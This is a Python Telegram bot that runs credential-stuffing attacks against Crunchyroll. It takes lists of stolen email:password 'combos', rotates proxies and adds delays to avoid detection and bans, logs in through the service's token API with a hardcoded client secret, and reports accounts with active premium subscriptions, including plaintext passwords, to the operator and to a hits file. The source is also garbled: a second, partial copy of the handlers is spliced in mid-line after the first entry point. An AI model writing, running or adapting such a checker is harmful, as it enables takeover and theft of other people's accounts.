import os
import asyncio
import uuid
import random
import time
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram import F

BOT_TOKEN = os.getenv("BOT_TOKEN")
AUTHORIZED_USERS = [int(x.strip()) for x in os.getenv("AUTHORIZED_USERS", "").split(",") if x.strip()]

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

checker = None
proxies = []
stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}


class CrunchyrollChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.proxy_index = 0

    def get_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.proxy_index % len(self.proxies)]
        self.proxy_index += 1
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

    def check(self, email, password):
        try:
            session = requests.Session()
            proxy = self.get_proxy()
            if proxy:
                session.proxies.update(proxy)

            data = {
                'grant_type': 'password',
                'username': email,
                'password': password,
                'scope': 'offline_access',
                'client_id': 'y2arvjb0h0rgvtizlovy',
                'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
                'device_type': 'Baron',
                'device_id': str(uuid.uuid4()),
            }

            r = session.post("https://beta-api.crunchyroll.com/auth/v1/token", data=data, timeout=15)

            if r.status_code != 200 or '"access_token"' not in r.text:
                return {"status": "INVALID", "email": email}

            token = r.json().get("access_token")
            headers = {"authorization": f"Bearer {token}"}

            me = session.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers, timeout=10).json()
            external_id = me.get("external_id")

            sub = session.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}", 
                            headers=headers, timeout=10).json()

            is_premium = sub.get("is_active", False) and not sub.get("is_cancelled", False)

            return {
                "status": "PREMIUM" if is_premium else "FREE",
                "email": email,
                "password": password,
                "expiry": str(sub.get("next_renewal_date", "N/A"))[:10],
                "country": sub.get("country_code", "Unknown")
            }
        except:
            return {"status": "ERROR", "email": email}


async def send_result(chat_id, result):
    if result["status"] == "PREMIUM":
        text = f"""🎯 <b>PREMIUM HIT</b>
<pre>
Email   : {result['email']}
Pass    : {result['password']}
Expiry  : {result['expiry']}
Country : {result['country']}
</pre>"""
        await bot.send_message(chat_id, text, parse_mode="HTML")
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write(f"PREMIUM | {result['email']}:{result['password']} | {result['expiry']}\n")
    elif result["status"] == "FREE":
        await bot.send_message(chat_id, f"🆓 FREE → {result['email']}")
    else:
        await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")


@dp.message(Command("start"))
async def start(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS: return
    await message.answer("✅ Bot is ready.\nSend /check + combo or upload file.")


@dp.message(F.document | F.text)
async def handle(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return

    global checker

    if message.document:
        file = await bot.get_file(message.document.file_id)
        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
    else:
        content = message.text.replace("/check", "").strip()

    lines = [line.strip() for line in content.splitlines() if ":" in line and "@" in line]

    if not lines:
        return await message.answer("No valid combos found.")

    # Load proxies
    if "@" not in "".join(lines[:5]):
        global proxies
        proxies = lines
        checker.proxies = proxies
        return await message.answer(f"✅ Loaded {len(proxies)} proxies.")

    # Check combos
    await message.answer(f"🚀 Starting check on {len(lines)} combos... (slow mode)")

    for line in lines:
        try:
            email, password = line.split(":", 1)
            result = checker.check(email.strip(), password.strip())

            stats['checked'] += 1
            if result["status"] == "PREMIUM":
                stats['premium'] += 1
            elif result["status"] == "FREE":
                stats['free'] += 1
            else:
                stats['invalid'] += 1

            await send_result(message.from_user.id, result)

            await asyncio.sleep(2.5)  # ← Increased delay to avoid rate limit

        except Exception:
            continue


async def main():
    global checker
    checker = CrunchyrollChecker(proxies)
    print("✅ Bot started")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())    if message.from_user.id not in AUTHORIZED_USERS: return
    await message.answer("✅ Bot Online\nUse /check + combos or upload file")


@dp.message(Command("stats"))
async def stats_cmd(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS: return
    await message.answer(f"📊 Checked: {stats['checked']}\n✅ Premium: {stats['premium']}")


@dp.message(Command("hits"))
async def hits_cmd(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS or not os.path.exists("hits.txt"):
        return await message.answer("No hits yet.")
    await message.answer_document(FSInputFile("hits.txt"))


@dp.message(F.document | F.text)
async def handle(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return

    global checker

    if message.document:
        file = await bot.get_file(message.document.file_id)
        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
    else:
        content = message.text.replace("/check", "").strip()

    lines = [line.strip() for line in content.splitlines() if ":" in line and len(line) > 10]

    if not lines:
        return await message.answer("No valid combos found.")

    # Proxy loading
    if "@" not in "".join(lines[:5]):
        global proxies
        proxies = [p for p in lines if p]
        checker.proxies = proxies
        return await message.answer(f"✅ Loaded {len(proxies)} proxies.")

    # Checking
    await message.answer(f"🚀 Starting check on {len(lines)} combos... (with delay)")

    for line in lines:
        try:
            email, password = line.split(":", 1)
            result = checker.check(email.strip(), password.strip())
            
            stats['checked'] += 1
            if result["status"] == "PREMIUM":
                stats['premium'] += 1
            elif result["status"] == "FREE":
                stats['free'] += 1
            else:
                stats['invalid'] += 1

            await send_result(message.from_user.id, result)
            
            await asyncio.sleep(1.5)   # ← Important delay to avoid ban

        except:
            continue


async def main():
    global checker
    checker = CrunchyrollChecker(proxies)
    print("Bot Started")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
